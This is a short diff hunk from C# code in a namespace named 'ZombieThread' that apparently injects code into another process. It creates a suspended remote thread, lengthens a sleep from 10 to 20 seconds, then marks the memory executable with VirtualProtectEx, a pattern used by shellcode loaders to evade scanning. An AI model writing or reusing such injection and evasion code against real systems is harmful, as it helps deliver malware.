@@ -70,7 +70,7 @@ namespace ZombieThread
 
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);
 
-            System.Threading.Thread.Sleep(10000);
+            System.Threading.Thread.Sleep(20000);
 
             VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x40, out lpflOldProtect);
         
